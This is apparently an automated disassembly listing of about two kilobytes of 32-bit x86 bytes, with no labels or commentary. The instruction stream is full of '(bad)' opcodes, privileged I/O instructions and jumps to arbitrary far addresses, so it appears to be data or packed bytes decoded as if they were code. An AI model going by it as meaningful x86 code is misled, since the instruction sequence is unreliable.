  423064:	scas   al,BYTE PTR es:[edi]
  423065:	loopne 0x423023
  423067:	mov    dh,al
  423069:	in     eax,0xc5
  42306b:	push   ds
  42306c:	data16 je 0x423004
  42306f:	cld    
  423070:	int3   
  423071:	jge    0x42302c
  423073:	inc    eax
  423074:	lds    ebx,FWORD PTR [ebx+0x4f3e34be]
  42307a:	dec    ebp
  42307b:	or     ebp,edx
  42307d:	jae    0x4230d3
  42307f:	hlt    
  423080:	adc    BYTE PTR [esi],dl
  423082:	mov    ebx,0xe2bcbd39
  423087:	push   ebp
  423088:	lea    eax,[ebx+0x11d5e9f0]
  42308e:	jmp    0xcdf3:0xfc1fb581
  423095:	adc    al,0xd8
  423097:	sbb    DWORD PTR [edi],0x39
  42309a:	jle    0x4230d3
  42309c:	ror    BYTE PTR [edx-0x57970c5a],1
  4230a2:	jmp    0x4230fd
  4230a4:	fcmovnb st,st(6)
  4230a6:	retf   
  4230a7:	mov    cl,0x1
  4230a9:	call   edx
  4230ab:	pop    edx
  4230ac:	push   edx
  4230ad:	push   ebp
  4230ae:	mov    bl,0xe4
  4230b0:	ins    BYTE PTR es:[edi],dx
  4230b1:	fwait
  4230b2:	xchg   esi,eax
  4230b3:	clc    
  4230b4:	gs inc ebp
  4230b6:	mov    edx,0xf85a80f3
  4230bb:	shl    BYTE PTR [ebx-0x1698e2a3],1
  4230c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4230c2:	stos   DWORD PTR es:[edi],eax
  4230c3:	iret   
  4230c4:	or     DWORD PTR [ebx],esi
  4230c6:	enter  0x6f38,0x3a
  4230ca:	lahf   
  4230cb:	xor    eax,0x7958cafd
  4230d0:	mov    ecx,0x1df170e8
  4230d5:	sub    ebx,DWORD PTR gs:[eax-0x60]
  4230d9:	addr16 mov ah,0x33
  4230dc:	or     edi,DWORD PTR [edx-0x61b04bef]
  4230e2:	sar    DWORD PTR [esi],cl
  4230e4:	dec    ebp
  4230e5:	in     eax,0xd0
  4230e7:	lock xchg ebp,eax
  4230e9:	pop    esi
  4230ea:	shl    dl,1
  4230ec:	imul   edx,DWORD PTR [esi],0x89181dfc
  4230f2:	pop    edx
  4230f3:	jecxz  0x42312b
  4230f5:	jmp    0xa8a3fe38
  4230fa:	sbb    edi,DWORD PTR [edi-0xaaaf767]
  423100:	(bad)  
  423101:	jno    0x4230a2
  423103:	jmp    0x153a:0x94c05805
  42310a:	mov    al,ds:0xb314b46f
  42310f:	xor    bh,BYTE PTR [eax+0x51]
  423112:	pop    ecx
  423113:	scas   eax,DWORD PTR es:[edi]
  423114:	test   DWORD PTR [ebp+0x5837e594],edx
  42311a:	adc    al,0x31
  42311c:	and    edx,edx
  42311e:	mov    cl,0x84
  423120:	mov    dh,0xc0
  423122:	mov    esi,0xda8af5d1
  423127:	call   0xe5848d13
  42312c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42312d:	scas   al,BYTE PTR es:[edi]
  42312e:	aas    
  42312f:	mov    ds:0xfa216075,eax
  423134:	outs   dx,BYTE PTR ds:[esi]
  423135:	jmp    0x4231a9
  423137:	pop    edi
  423138:	xor    DWORD PTR [ebx],esp
  42313a:	xor    bl,dl
  42313c:	sub    ebx,DWORD PTR [ecx-0x2988b7e9]
  423142:	push   ss
  423143:	gs and eax,0x62d7e9b9
  423149:	sub    eax,0xa6d96036
  42314e:	fwait
  42314f:	retf   0x50f5
  423152:	sbb    BYTE PTR [ecx+0x6f],dl
  423155:	rcl    DWORD PTR [edi],0xe7
  423158:	jmp    0x42311d
  42315a:	mov    ah,0x34
  42315c:	cmp    esp,esi
  42315e:	add    eax,0x3c871501
  423163:	jmp    0xcfbaeaf9
  423168:	retf   
  423169:	dec    esp
  42316a:	cmp    dl,BYTE PTR [edx]
  42316c:	(bad)  
  42316d:	xor    al,0x5f
  42316f:	sbb    edx,DWORD PTR [ebp+0x20]
  423172:	dec    edx
  423173:	jbe    0x4231a0
  423175:	fwait
  423176:	imul   esi,DWORD PTR [eax],0xffffff8a
  423179:	mov    ah,0xb9
  42317b:	mov    al,0x7a
  42317d:	(bad)  
  42317e:	lea    edx,[edx-0x2b3a3f30]
  423184:	mov    cl,0x8e
  423186:	test   edi,ebx
  423188:	dec    eax
  423189:	sub    BYTE PTR [ecx],cl
  42318b:	add    al,dl
  42318d:	sbb    DWORD PTR [ebx+eax*1+0x3e],0x85cc5ac1
  423195:	and    BYTE PTR [eax+0x52491830],bh
  42319b:	mov    bh,0xde
  42319d:	pop    ecx
  42319e:	mov    DWORD PTR [ebx],0x4c8b99b4
  4231a4:	pop    edi
  4231a5:	jb     0x423221
  4231a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4231a8:	loopne 0x4231fb
  4231aa:	rol    esp,1
  4231ac:	cmp    dl,BYTE PTR [edi-0xd0dab4a]
  4231b2:	and    DWORD PTR [ebx],ecx
  4231b4:	add    eax,0xaff22bfc
  4231b9:	(bad)  
  4231ba:	out    0xb3,al
  4231bc:	push   ds
  4231bd:	pop    ecx
  4231be:	fs (bad) 
  4231c0:	mov    esp,0x18ff497b
  4231c5:	pushf  
  4231c6:	imul   esi,DWORD PTR [ebx-0x2a],0x33
  4231ca:	xchg   ebx,eax
  4231cb:	icebp  
  4231cc:	gs sub al,0xbf
  4231cf:	dec    ebp
  4231d0:	jnp    0x423224
  4231d2:	xchg   edi,eax
  4231d3:	inc    ebp
  4231d4:	sbb    DWORD PTR [ebp+0x492bb0f0],eax
  4231da:	add    bl,al
  4231dc:	aad    0xc5
  4231de:	pop    edi
  4231df:	out    dx,eax
  4231e0:	iret   
  4231e1:	sbb    al,0xa3
  4231e3:	xchg   edx,eax
  4231e4:	sbb    edi,ecx
  4231e6:	int    0xf6
  4231e8:	dec    ebp
  4231e9:	mov    BYTE PTR [eax-0x245b4c03],cl
  4231ef:	mov    ebx,0x1f7ea907
  4231f4:	sub    cl,dl
  4231f6:	jb     0x423186
  4231f8:	fistp  WORD PTR [edx]
  4231fa:	mov    ebp,0x13bef814
  4231ff:	add    DWORD PTR [ebp+0xf],0x4425eb49
  423206:	pushf  
  423207:	pop    ebp
  423208:	mov    edx,0x79466cb8
  42320d:	loop   0x4231c6
  42320f:	and    al,0x5
  423211:	popf   
  423212:	xor    al,0x97
  423214:	aaa    
  423215:	retf   
  423216:	icebp  
  423217:	mov    ah,0x36
  423219:	add    BYTE PTR [ebx+0x5f],al
  42321c:	add    eax,0x22ed4bfd
  423221:	imul   esi,DWORD PTR [ebx-0x5a],0x8e68da30
  423228:	in     al,0x23
  42322a:	push   ebx
  42322b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42322c:	callw  0x4d69
  423230:	xchg   edx,eax
  423231:	jl     0x423260
  423233:	add    BYTE PTR [eax+0x31dcbf24],0x5d
  42323a:	mov    dl,0x24
  42323c:	iret   
  42323d:	inc    ebp
  42323e:	or     DWORD PTR [ebx],edx
  423240:	cmc    
  423241:	dec    esp
  423242:	jp     0x42322e
  423244:	daa    
  423245:	push   ebx
  423246:	aas    
  423247:	dec    esi
  423248:	cmp    eax,esi
  42324a:	xchg   esi,eax
  42324b:	mov    al,0xd7
  42324d:	stos   BYTE PTR es:[edi],al
  42324e:	mov    ah,0x14
  423250:	pop    ss
  423251:	xor    esp,DWORD PTR [ecx-0x7e]
  423254:	xor    eax,0x48e527c9
  423259:	sbb    al,0x7f
  42325b:	jo     0x423274
  42325d:	or     esi,eax
  42325f:	mov    esp,0xb490fd0d
  423264:	dec    edi
  423265:	js     0x423256
  423267:	sbb    DWORD PTR [ecx+ebp*4],0x5f676d16
  42326e:	in     al,dx
  42326f:	push   ss
  423270:	and    DWORD PTR [ecx+0x631aa625],ecx
  423276:	dec    ebx
  423277:	sub    eax,0x92d9a48b
  42327c:	popf   
  42327d:	fwait
  42327e:	pop    ebx
  42327f:	(bad)  [ebp-0x3e]
  423282:	jbe    0x42325d
  423284:	push   ds
  423285:	jg     0x423210
  423287:	or     al,0x5c
  423289:	lahf   
  42328a:	mov    al,0xd4
  42328c:	lahf   
  42328d:	ss gs std 
  423290:	push   esi
  423291:	mov    esp,0x809019df
  423296:	xor    BYTE PTR [ecx-0x20349892],ah
  42329c:	sbb    DWORD PTR [ecx+0x67cefc7],ebp
  4232a2:	pop    esi
  4232a3:	mov    DWORD PTR [esi-0x60],edi
  4232a6:	fwait
  4232a7:	mov    ds:0xb053a8f1,al
  4232ac:	xor    al,0xb3
  4232ae:	es stos BYTE PTR es:[edi],al
  4232b0:	pop    ss
  4232b1:	or     DWORD PTR [edx-0x24],eax
  4232b4:	push   edx
  4232b5:	out    0x5a,al
  4232b7:	cmp    BYTE PTR [eax+ecx*8+0x34a3267b],ch
  4232be:	mov    al,ds:0x31a8f12d
  4232c3:	or     BYTE PTR [ebp+0x18b43bd0],bh
  4232c9:	clc    
  4232ca:	inc    eax
  4232cb:	sub    BYTE PTR [ecx],bl
  4232cd:	mov    ch,0x51
  4232cf:	or     ebx,DWORD PTR [ebx]
  4232d1:	imul   esp,ecx,0x6722c505
  4232d7:	sbb    BYTE PTR [esi-0x5c],0x5b
  4232db:	xchg   esi,eax
  4232dc:	adc    BYTE PTR [esi+ebx*8-0x2be7c1d1],al
  4232e3:	rcr    DWORD PTR [ebx-0x51],1
  4232e6:	mov    edi,0xbd47ee24
  4232eb:	pop    ss
  4232ec:	or     edx,ebx
  4232ee:	les    ebx,FWORD PTR fs:[ecx+ecx*8]
  4232f2:	outs   dx,DWORD PTR ds:[esi]
  4232f3:	mov    eax,0x670f00f6
  4232f8:	sbb    BYTE PTR [ecx-0x17a275c3],bl
  4232fe:	sub    BYTE PTR [esp+edx*2],bh
  423301:	clc    
  423302:	fcmovnb st,st(4)
  423304:	lea    esp,[ecx-0xdaad0f1]
  42330a:	out    dx,al
  42330b:	std    
  42330c:	push   es
  42330d:	fwait
  42330e:	jns    0x4232fc
  423310:	xchg   ebp,eax
  423311:	fldcw  WORD PTR [edi+0x733d46e]
  423317:	mov    ah,0x2a
  423319:	xchg   esp,eax
  42331a:	mov    dh,0x3d
  42331c:	cdq    
  42331d:	or     bl,BYTE PTR [ecx]
  42331f:	ret    0x5496
  423322:	mov    ah,0x74
  423324:	dec    ecx
  423325:	test   BYTE PTR [eax+ebp*8],dh
  423328:	bound  ebp,QWORD PTR [eax+0x1b7f6893]
  42332e:	ins    DWORD PTR es:[edi],dx
  42332f:	ret    
  423330:	sahf   
  423331:	inc    edi
  423332:	cmp    bh,BYTE PTR [ebx-0xb]
  423335:	mov    ebx,0x98af02c
  42333a:	sbb    ecx,esi
  42333c:	sbb    cl,bl
  42333e:	add    ebp,esi
  423340:	cmp    al,0x81
  423342:	inc    ebx
  423343:	pop    esp
  423344:	std    
  423345:	sahf   
  423346:	retf   
  423347:	inc    edx
  423348:	aad    0x5f
  42334a:	enter  0xbdb7,0xd7
  42334e:	aad    0x92
  423350:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423351:	lods   al,BYTE PTR ds:[esi]
  423352:	mov    esp,0xe42deac4
  423357:	adc    al,ch
  423359:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42335a:	out    dx,al
  42335b:	in     eax,dx
  42335c:	push   edi
  42335d:	lds    edx,FWORD PTR [esi-0x5e]
  423360:	clc    
  423361:	sub    DWORD PTR [esi+0x25d166e2],ebx
  423367:	ins    BYTE PTR es:[edi],dx
  423368:	mov    ds,WORD PTR [edi-0x63865b29]
  42336e:	sbb    eax,esi
  423370:	cs and al,0xde
  423373:	xchg   edx,eax
  423374:	pop    esi
  423375:	push   es
  423376:	xchg   esp,eax
  423377:	push   0x2b
  423379:	jge    0x423366
  42337b:	push   esp
  42337c:	sub    edi,DWORD PTR [esi]
  42337e:	stos   DWORD PTR es:[edi],eax
  42337f:	xor    eax,0xe8b5b6c1
  423384:	aad    0x7f
  423386:	jns    0x423371
  423388:	push   edi
  423389:	popa   
  42338a:	ins    BYTE PTR es:[edi],dx
  42338b:	jp     0x4233a4
  42338d:	pop    ecx
  42338e:	cmc    
  42338f:	xchg   BYTE PTR [edi+0x4f],al
  423392:	pop    edx
  423393:	icebp  
  423394:	adc    al,bl
  423396:	stos   DWORD PTR es:[edi],eax
  423397:	cld    
  423398:	lods   eax,DWORD PTR ds:[esi]
  423399:	add    eax,0xb69b456d
  42339e:	inc    edi
  42339f:	cmp    ah,BYTE PTR [ecx]
  4233a1:	cmp    DWORD PTR [ecx],ecx
  4233a3:	push   0xc8f83cc7
  4233a8:	nop
  4233a9:	mov    al,ds:0x1fc236eb
  4233ae:	mov    ds:0x16a6819d,eax
  4233b3:	fidivr WORD PTR [eax+0xe]
  4233b6:	retf   0x5a44
  4233b9:	push   ebx
  4233ba:	int3   
  4233bb:	and    esi,edx
  4233bd:	fwait
  4233be:	cmp    esi,DWORD PTR [ecx]
  4233c0:	jp     0x4233a9
  4233c2:	jecxz  0x423416
  4233c4:	fnstcw WORD PTR [edx+eax*8+0x5c]
  4233c8:	mov    al,0xe9
  4233ca:	mov    edi,0x8ea1a564
  4233cf:	sub    dh,BYTE PTR [esi-0x1c]
  4233d2:	fisttp WORD PTR fs:[edx-0x7fab7e19]
  4233d9:	mov    WORD PTR [edx-0x18],gs
  4233dc:	pop    ss
  4233dd:	mov    DWORD PTR [edi+edx*8-0x45],ebp
  4233e1:	cmp    DWORD PTR [ecx+0x3ba046e2],ebx
  4233e7:	push   eax
  4233e8:	push   esp
  4233e9:	into   
  4233ea:	out    0x77,eax
  4233ec:	push   edx
  4233ed:	jae    0x423467
  4233ef:	add    eax,0xcad9919
  4233f4:	popw   es
  4233f6:	cmp    dl,BYTE PTR ds:0x6482cff1
  4233fc:	cmc    
  4233fd:	ja     0x42346f
  4233ff:	repnz mov ah,0x98
  423402:	inc    eax
  423403:	sbb    BYTE PTR [ecx+edi*1],ah
  423406:	inc    ebx
  423407:	mov    ecx,0x48e87d78
  42340c:	mov    ch,0xbe
  42340e:	imul   edi,edx,0x6e
  423411:	jno    0x4233e8
  423413:	sbb    DWORD PTR [edi],eax
  423415:	add    dh,BYTE PTR [esi]
  423417:	xchg   esp,eax
  423418:	in     eax,0xca
  42341a:	lds    ecx,FWORD PTR [edx+0x39889d23]
  423420:	test   al,0x39
  423422:	scas   al,BYTE PTR es:[edi]
  423423:	cmp    eax,0xbf6b9ba3
  423428:	ret    
  423429:	nop
  42342a:	xchg   DWORD PTR [ecx-0x2b5b076a],esp
  423430:	dec    eax
  423431:	arpl   WORD PTR [ebx],cx
  423433:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423434:	xchg   edi,eax
  423435:	cwde   
  423436:	mov    ch,0x35
  423438:	shr    ah,cl
  42343a:	pusha  
  42343b:	and    al,0xb5
  42343d:	lods   al,BYTE PTR ds:[esi]
  42343e:	addr16 in eax,0x40
  423441:	stc    
  423442:	in     al,0x77
  423444:	push   ebp
  423445:	ins    DWORD PTR es:[edi],dx
  423446:	jb     0x42342f
  423448:	fidiv  WORD PTR [ebp-0x70]
  42344b:	sub    eax,0xa0e3fda0
  423450:	inc    ebp
  423451:	mov    ah,BYTE PTR [ebx-0x1a]
  423454:	fsub   st,st(4)
  423456:	push   ebp
  423457:	cwde   
  423458:	mov    BYTE PTR [edi+0x50],0xd
  42345c:	aad    0x60
  42345e:	jge    0x42341b
  423460:	mov    ch,0xef
  423462:	mov    esi,0x40b890e0
  423467:	cmc    
  423468:	fidivr WORD PTR [ecx-0x3adde642]
  42346e:	fst    st(5)
  423470:	popa   
  423471:	mov    dl,0x9b
  423473:	jge    0x42348a
  423475:	jbe    0x423462
  423477:	xchg   edx,eax
  423478:	jb     0x42341c
  42347a:	sahf   
  42347b:	lock push esi
  42347d:	ja     0x423449
  42347f:	push   edx
  423480:	inc    esi
  423481:	gs lahf 
  423483:	clc    
  423484:	dec    esi
  423485:	sbb    eax,0x9b010a81
  42348a:	shl    DWORD PTR ds:0xe2bbd121,1
  423490:	loopne 0x4234f9
  423492:	in     eax,0x87
  423494:	cs in  al,0xd
  423497:	gs aaa 
  423499:	cmp    DWORD PTR [ebx-0x17],edx
  42349c:	sahf   
  42349d:	push   edi
  42349e:	dec    esi
  42349f:	pushf  
  4234a0:	cmp    ebx,ebp
  4234a2:	mov    bl,0xf4
  4234a4:	push   eax
  4234a5:	aam    0xf4
  4234a7:	stos   DWORD PTR es:[edi],eax
  4234a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4234a9:	test   eax,0x61e0e973
  4234ae:	out    dx,al
  4234af:	xlat   BYTE PTR ds:[ebx]
  4234b0:	cmp    eax,0xe4e43c27
  4234b5:	not    BYTE PTR [edi-0x40bf56ea]
  4234bb:	and    al,0xcd
  4234bd:	call   0xb992:0xb9faeabb
  4234c4:	js     0x423470
  4234c6:	loope  0x4234fb
  4234c8:	rol    DWORD PTR [edi-0x59728b18],0xfa
  4234cf:	pop    esp
  4234d0:	fisub  DWORD PTR [ecx+0x5799ebab]
  4234d6:	int    0x43
  4234d8:	xchg   edx,eax
  4234d9:	sti    
  4234da:	sbb    dh,BYTE PTR [eax-0x35]
  4234dd:	fdivr  QWORD PTR [eax+0x4]
  4234e0:	pop    bp
  4234e2:	in     al,dx
  4234e3:	fisub  DWORD PTR [edx]
  4234e5:	jmp    0x42349a
  4234e7:	add    DWORD PTR [ebx],esp
  4234e9:	add    eax,0xe26e64cc
  4234ee:	jns    0x4234d9
  4234f0:	lea    esp,[edi-0x1302ad65]
  4234f6:	push   ss
  4234f7:	inc    edi
  4234f8:	or     al,ah
  4234fa:	mov    dh,0x7c
  4234fc:	and    BYTE PTR ds:0x1ce5356a,bl
  423502:	push   ss
  423503:	jmp    0x40a5:0xdefba2af
  42350a:	mov    cl,0x6a
  42350c:	inc    esp
  42350d:	fwait
  42350e:	lods   eax,DWORD PTR ds:[esi]
  42350f:	aam    0xc0
  423511:	or     al,0xbf
  423513:	adc    al,0x8b
  423515:	imul   edx,DWORD PTR [ebx+0x22cc05e4],0xfffffff1
  42351c:	stos   DWORD PTR es:[edi],eax
  42351d:	xor    esi,DWORD PTR [eax-0xc]
  423520:	and    bh,BYTE PTR [ecx-0x5d95d421]
  423526:	test   DWORD PTR [edx+0x49],edx
  423529:	cdq    
  42352a:	jmp    0x4234cb
  42352c:	push   ecx
  42352d:	xchg   ch,dh
  42352f:	lahf   
  423530:	aas    
  423531:	shr    DWORD PTR [ebp+0x11],0xe4
  423535:	loope  0x4234f4
  423537:	push   esp
  423538:	aad    0xc1
  42353a:	(bad)  
  42353b:	mov    bl,0x49
  42353d:	jle    0x4234c9
  42353f:	mov    al,ds:0x94b4c32f
  423544:	mov    ds:0xc49bf477,eax
  423549:	jo     0x4234fb
  42354b:	inc    esp
  42354c:	test   DWORD PTR [edx+0x48],edx
  42354f:	xor    ch,0x18
  423552:	cdq    
  423553:	jmp    0x423589
  423555:	nop
  423556:	cmp    edx,DWORD PTR [ecx-0x45ef56d3]
  42355c:	xchg   ecx,esp
  42355e:	mov    bh,0x57
  423560:	call   0xddc1:0x950ab1f8
  423567:	repnz mov cl,0xfb
  42356a:	sub    eax,0x158921fa
  42356f:	shl    DWORD PTR [ecx-0x6851dfce],cl
  423575:	lahf   
  423576:	fwait
  423577:	inc    edx
  423578:	pop    ss
  423579:	repz add DWORD PTR [edi-0x17],0x10218496
  423581:	mov    eax,0x1cee75d2
  423586:	ja     0x42352e
  423588:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423589:	cs jmp 0x450d:0x1f0bb9ec
  423591:	test   al,0x6b
  423593:	jno    0x423607
  423595:	mov    eax,DWORD PTR [edi-0x75]
  423598:	repz sar BYTE PTR [eax+edi*2],0xed
  42359d:	cmp    DWORD PTR [edi+0x379ed574],0x73
  4235a4:	test   BYTE PTR [ebx],0x7
  4235a7:	fisub  WORD PTR [ebx]
  4235a9:	bt     DWORD PTR [edx],eax
  4235ac:	ss repz cli 
  4235af:	dec    edx
  4235b0:	sbb    DWORD PTR [ebp-0x45],ebp
  4235b3:	xchg   esp,eax
  4235b4:	loopne 0x4235db
  4235b6:	jmp    0x42362b
  4235b8:	(bad)  
  4235bb:	call   0x6ec88ba8
  4235c0:	fcomp  QWORD PTR [edx-0xae0d9f2]
  4235c6:	xchg   ecx,eax
  4235c7:	dec    esp
  4235c8:	mov    dl,BYTE PTR [eax*1+0x6b9d8e42]
  4235cf:	call   0x37090b03
  4235d4:	test   BYTE PTR [edi],cl
  4235d6:	push   0x7e678aaa
  4235db:	xchg   DWORD PTR [ebx-0x6c7b40b0],ebp
  4235e1:	leave  
  4235e2:	pop    esp
  4235e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4235e4:	cdq    
  4235e5:	lahf   
  4235e6:	retf   
  4235e7:	(bad)
  4235ea:	fbld   TBYTE PTR [esi+0x40373919]
  4235f0:	adc    cl,bh
  4235f2:	call   0x7be36e7b
  4235f7:	mov    dl,0x10
  4235f9:	cmp    DWORD PTR [eax],eax
  4235fb:	int    0x50
  4235fd:	push   0xf
  4235ff:	test   DWORD PTR [ebp+0x35c4bfc1],ebp
  423605:	(bad)  [ebp+0x4d]
  423608:	test   DWORD PTR [ecx],ebx
  42360a:	mov    ecx,0x83fc21eb
  42360f:	repz and BYTE PTR [ecx],bl
  423612:	ror    edi,1
  423614:	stos   BYTE PTR es:[edi],al
  423615:	sub    BYTE PTR [esi],0xd9
  423618:	adc    ebp,DWORD PTR [edx+0x5b71ba8b]
  42361e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42361f:	and    ch,ah
  423621:	sbb    al,0x29
  423623:	xchg   ecx,edx
  423625:	sub    DWORD PTR [ebp+0x67],edx
  423628:	xchg   DWORD PTR [ebp-0x50accfed],esp
  42362e:	push   es
  42362f:	sbb    ebp,edi
  423631:	(bad)  [ebp-0x398fe017]
  423638:	cdq    
  423639:	mov    ebx,0x99746d06
  42363e:	repnz and ebx,DWORD PTR [edi+edx*8]
  423642:	push   ebp
  423643:	cmp    dl,BYTE PTR [edx+ebp*4-0x45]
  423647:	fadd   st(6),st
  423649:	cs inc bx
  42364c:	dec    edi
  42364d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42364e:	rcr    DWORD PTR [ecx+0x4a80863d],cl
  423654:	xchg   edi,eax
  423655:	push   cs
  423656:	mov    edi,0xc3287e24
  42365b:	cmp    eax,ebp
  42365d:	std    
  42365e:	pop    esp
  42365f:	jmp    0x6dd49fc0
  423664:	iret   
  423665:	sbb    DWORD PTR [edi+ecx*8-0x7df45ef3],esp
  42366c:	mov    edi,0xfd11e73a
  423671:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423672:	jmp    0x4236b1
  423674:	jnp    0x423641
  423676:	test   DWORD PTR [edi-0x6],0xd906dddc
  42367d:	jae    0x423636
  42367f:	je     0x42368b
  423681:	imul   eax,DWORD PTR [ebx+0x26],0xffffff85
  423685:	jno    0x4236dc
  423687:	jmp    0x4236ea
  423689:	adc    cl,dl
  42368b:	xor    al,0x24
  42368d:	cmp    DWORD PTR ds:0xc5accb0c,eax
  423693:	jp     0x423628
  423695:	mov    ebp,0xa7a3fbc2
  42369a:	dec    ebx
  42369b:	repnz or al,0x10
  42369e:	stos   BYTE PTR es:[edi],al
  42369f:	mov    DWORD PTR [eax+0x586a594a],edi
  4236a5:	mov    ax,0x6ed4
  4236a9:	xlat   BYTE PTR ds:[ebx]
  4236aa:	sbb    eax,0x3d111552
  4236af:	hlt    
  4236b0:	rol    DWORD PTR [ebx-0x20],1
  4236b3:	add    BYTE PTR [ecx+ebp*1-0x5a521c2a],ch
  4236ba:	mov    bl,0x1e
  4236bc:	pop    eax
  4236bd:	outs   dx,BYTE PTR ds:[esi]
  4236be:	jecxz  0x4236ff
  4236c0:	adc    eax,0x57e69b71
  4236c5:	(bad)  
  4236c7:	cmp    BYTE PTR [edx],bl
  4236c9:	imul   esi,DWORD PTR [ebp-0x41513dd6],0xdf81f0f2
  4236d3:	scas   al,BYTE PTR es:[edi]
  4236d4:	and    edi,ecx
  4236d6:	fwait
  4236d7:	pop    ss
  4236d8:	outs   dx,DWORD PTR ds:[esi]
  4236d9:	mov    esi,0x19183769
  4236de:	jge    0x42366b
  4236e0:	aad    0xfd
  4236e2:	pop    ss
  4236e3:	sbb    al,0xcb
  4236e5:	test   eax,0x3cbb1a4b
  4236ea:	cli    
  4236eb:	(bad)  [ecx]
  4236ed:	mov    ds:0x6903addf,al
  4236f2:	retf   
  4236f3:	pop    edi
  4236f4:	jp     0x423702
  4236f6:	mov    cl,0x14
  4236f8:	cwde   
  4236f9:	out    dx,al
  4236fa:	ret    
  4236fb:	neg    BYTE PTR [ecx]
  4236fd:	fs ins BYTE PTR es:[edi],dx
  4236ff:	mov    al,BYTE PTR [ecx]
  423701:	ret    
  423702:	xor    eax,0xeb2720ee
  423707:	and    al,0xfc
  423709:	mov    DWORD PTR [esi+0x4b13f6b4],edi
  42370f:	jns    0x423748
  423711:	scas   al,BYTE PTR es:[edi]
  423712:	scas   eax,DWORD PTR es:[edi]
  423713:	ror    ecx,1
  423715:	adc    esp,DWORD PTR [esi]
  423717:	in     al,dx
  423718:	idiv   BYTE PTR [edx+0x73]
  42371b:	cmp    esi,DWORD PTR [edi+0x7444b1b4]
  423721:	xchg   BYTE PTR [edx-0x4a],ah
  423724:	inc    ebp
  423725:	mov    edi,0xa6d0f28f
  42372a:	popa   
  42372b:	mul    DWORD PTR ds:0xb066dec9
  423731:	mov    ecx,DWORD PTR ds:0x2ba0cea9
  423737:	pop    esp
  423738:	gs daa 
  42373a:	mov    edi,0xd250e561
  42373f:	or     eax,0x7711c8b3
  423744:	pop    ebp
  423745:	retf   0x64b0
  423748:	dec    ebp
  423749:	mov    ds:0xf31162db,eax
  42374e:	jg     0x423757
  423750:	jmp    0x9fec5323
  423755:	sub    bh,BYTE PTR [esi+0x6b5ee194]
  42375b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42375c:	xor    eax,0x47f08fac
  423761:	add    al,dl
  423763:	inc    esi
  423764:	pop    ds
  423765:	dec    ecx
  423766:	jmp    0x2a94ba9e
  42376b:	enter  0xc570,0x7a
  42376f:	cmp    edx,DWORD PTR [ebp+0x17ed55b0]
  423775:	sub    eax,0x98f664e
  42377a:	dec    ecx
  42377b:	and    al,0x14
  42377d:	inc    edi
  42377e:	sub    esp,DWORD PTR [edi]
  423780:	mov    gs,esi
  423782:	mov    bh,0xd3
  423784:	inc    ebp
  423785:	hlt    
  423786:	cmp    al,0xef
  423788:	pop    es
  423789:	inc    ebp
  42378a:	pop    ss
  42378b:	add    esp,DWORD PTR [ecx]
  42378d:	mov    BYTE PTR [ebx],ch
  42378f:	or     al,0xf2
  423791:	mov    eax,ds:0x3c7d04b6
  423796:	hlt    
  423797:	sub    dl,BYTE PTR ds:0x6dfe1e97
  42379d:	aad    0x24
  42379f:	pop    ss
  4237a0:	mov    eax,ss
  4237a2:	sbb    al,0xef
  4237a4:	ja     0x42376e
  4237a6:	mov    edx,0xf5d5b4b4
  4237ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4237ac:	xor    eax,0x68f3262b
  4237b1:	loopne 0x4237ac
  4237b3:	rcl    DWORD PTR [esi],1
  4237b5:	or     DWORD PTR [eax+0x6a2ab4c8],edi
  4237bb:	fst    DWORD PTR [ebp-0x67]
  4237be:	jmp    0x4237d3
  4237c0:	mov    dh,0xdd
  4237c2:	test   BYTE PTR [ecx],dh
  4237c4:	push   cs
  4237c5:	arpl   WORD PTR [ebp-0x4a26dcfd],di
  4237cb:	loop   0x42377d
  4237cd:	lock mov ds:0x871f560a,eax
  4237d3:	pop    ss
  4237d4:	jne    0x423852
  4237d6:	shr    ah,1
  4237d8:	test   eax,0x228530e7
  4237dd:	leave  
  4237de:	ins    DWORD PTR es:[edi],dx
  4237df:	xor    ebp,ecx
  4237e1:	sub    BYTE PTR [edx],bl
  4237e3:	rol    DWORD PTR [ebp+0x5a91bb9a],cl
  4237e9:	adc    al,0x6
  4237eb:	fs test BYTE PTR ds:[edi+0x20e0dbea],0x35
  4237f4:	and    BYTE PTR [edi-0x5f465314],bl
  4237fa:	or     edi,DWORD PTR ds:0x603ce647
  423800:	mov    bh,0x32
  423802:	pusha  
  423803:	push   eax
  423804:	adc    BYTE PTR [edx],al
  423806:	xchg   ebp,eax
  423807:	inc    ebp
  423808:	xchg   ebx,eax
  423809:	call   DWORD PTR [ecx-0x19]
  42380c:	(bad)  
  42380d:	sahf   
  42380e:	fld    TBYTE PTR [edi-0x4408b27c]
  423814:	adc    cl,BYTE PTR [edi+esi*2]
  423817:	imul   edx,DWORD PTR ds:0x4087742f,0xc455afa5
  423821:	jl     0x4237bd
  423823:	xor    eax,0xde2a3bf9
  423828:	call   0x6eb5:0x90cb897
  42382f:	sti    
  423830:	xor    edi,DWORD PTR [eax+0x1e5f84b2]
  423836:	jno    0x423829
  423838:	test   DWORD PTR [edi-0x2e],esp
  42383b:	lock dec edi
  42383d:	mov    ds:0x6923857f,eax
  423842:	in     al,dx
  423843:	sbb    edx,0x86c3da78
  423849:	(bad)  
  42384a:	or     ah,BYTE PTR [ecx]
  42384c:	cmp    eax,0x5f469a4
  423851:	sub    al,0xa1
  423853:	jmp    0x4238c1
  423855:	test   al,0x1e
  423857:	push   0x30470924
  42385c:	pop    ecx
  42385d:	(bad)  
  42385e:	and    al,0x9d
  423860:	dec    edx
  423861:	mov    ds:0x3e96b7c4,eax
  423866:	aaa    
  423867:	pop    ds
  423868:	int    0x82
  42386a:	sbb    BYTE PTR [ebx-0x71],dl
  42386d:	imul   edi,DWORD PTR [esi],0xffffffbf
